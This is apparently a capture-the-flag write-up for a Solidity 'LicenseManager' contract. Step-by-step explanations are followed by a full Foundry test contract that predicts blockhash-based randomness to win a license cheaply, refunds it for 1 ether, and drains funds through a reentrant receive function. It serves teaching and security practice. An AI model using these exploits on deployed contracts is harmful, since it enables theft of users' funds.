# LicenseManager

## Objective of CTF

We are looking at a Smart Contract called LicenseManager for managing licenses that cost 1 ether

As attackers, we only have 0.01 ether. 
1. Our first goal is to get the license anyway. 
2. Also, find at least two ways to collect the ethers in the contract before the owner notices

## Proof of Concept

Exploit 1: 

a. The attacker has only 0.01 ether, which is not enough to buy a license directly.

b. The attacker initiates a loop where it keeps rolling the block number to change the context of the blockhash.

c. Within each iteration, the attacker calculates an algorithm using the current block number and other parameters.

d. The attacker checks if the calculated algorithm yields a number lower than the maxThreshold.

e. If the condition is satisfied, the attacker calls the winLicense function of the LicenseManager contract with 0.01 ether.

f. The loop continues until the attacker successfully wins a license.

g. Once the license is obtained, the attacker asserts that the license status is true.

Exploit 2.1:

a. The attacker calls the refundLicense function of the LicenseManager contract to refund the license they previously acquired.

b. This function removes the attacker's address from the licensed array and transfers 1 ether back to the attacker's address.

c. The attacker then checks that their license status is now false.

Exploit 2.2:

a. The attacker sends 1 ether to the LicenseManagerTest contract itself.

b. The attacker initiates a loop similar to Exploit 1, rolling the block number and calculating an algorithm.

c. If the calculated algorithm yields a number lower than the maxThreshold, the attacker calls the winLicense function with 0.01 ether.

d. The loop continues until the attacker wins a license.

e. Once the license is obtained, the attacker calls the refundLicense function to refund the license.

f. Within the refundLicense function, 1 ether is transferred to the LicenseManagerTest contract itself.

g. The attacker asserts that the balance of the LicenseManagerTest contract is now greater than 1 ether.

Reentrancy:

a. The LicenseManagerTest contract implements a receive function, which is a fallback function that is triggered when the contract receives ether.

b. The attacker sends ether to the LicenseManagerTest contract, which triggers the receive function.

c. If the balance of the LicenseManagerTest contract is less than 1 ether, the refundLicense function of the LicenseManager contract is called.

d. This creates a reentrancy vulnerability, as the refundLicense function transfers 1 ether back to the caller, which is the LicenseManagerTest contract in this case.

e. The attacker exploits this vulnerability by repeatedly calling the refundLicense function within the receive function until the balance of the LicenseManagerTest contract exceeds 1 ether.

These are the step-by-step explanations of the exploits executed in the given POC.

```
contract LicenseManagerTest is Test {
    LicenseManager license;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");

    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        license = new LicenseManager();

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        vm.prank(user1);
        license.buyLicense{value: 1 ether}();

        vm.prank(user2);
        license.buyLicense{value: 1 ether}();

        vm.prank(user3);
        license.buyLicense{value: 1 ether}();

        vm.prank(user4);
        license.buyLicense{value: 1 ether}();
    }

    function test_exploit1_2() public {
        vm.deal(attacker, 0.01 ether);
        vm.startPrank(attacker);

        //Challenge 1 solution

        uint256 currentBlockNumber = block.number;
        uint256 maxThreshold = uint256((0.01 ether / 1e16));
        bool hasLicense = false;

        while (!hasLicense) {
            vm.roll(currentBlockNumber);
            uint256 algorithm = uint256(
                keccak256(
                    abi.encodePacked(uint256(0.01 ether), address(attacker), uint256(1337), blockhash(block.number - 1))
                )
            );
            uint256 pickedNumber = algorithm % 100;
            if (pickedNumber < maxThreshold) {
                hasLicense = license.winLicense{value: 0.01 ether}();
            }
            currentBlockNumber++;
        }

        assertEq(true, hasLicense);
        assertEq(true, license.checkLicense());
        vm.stopPrank();

        vm.startPrank(attacker);

        //Challenge 2.1 solution
        license.refundLicense();
        assertFalse(license.checkLicense());

        assertGt(attacker.balance, 0.1 ether);
        vm.stopPrank();
    }

    // collect the ethers in the contract before the owner notices in second way.

    function test_exploit3() public {
        vm.deal(address(this), 1 ether);
        // challenge 2.2 solution

        uint256 currentBlockNumber = block.number;
        uint256 maxThreshold = uint256((0.01 ether / 1e16));
        bool hasLicense = false;

        while (!hasLicense) {
            vm.roll(currentBlockNumber);
            uint256 algorithm = uint256(
                keccak256(
                    abi.encodePacked(uint256(0.01 ether), address(this), uint256(1337), blockhash(block.number - 1))
                )
            );
            uint256 pickedNumber = algorithm % 100;
            if (pickedNumber < maxThreshold) {
                hasLicense = license.winLicense{value: 0.01 ether}();
            }
            currentBlockNumber++;
        }

        assertEq(true, hasLicense);
        assertEq(true, license.checkLicense());

        license.refundLicense();

        console.log("\tFinal Balance\t", address(this).balance);
        assertGt(address(this).balance, 1 ether);
    }

    receive() external payable {
        console.log("start reentrancy");
        if (address(this).balance < 1 ether) {
            license.refundLicense();
        }
    }
}

interface ILicenseManager {
    function winLicense() external payable returns (bool);
    function refundLicense() external;
}
```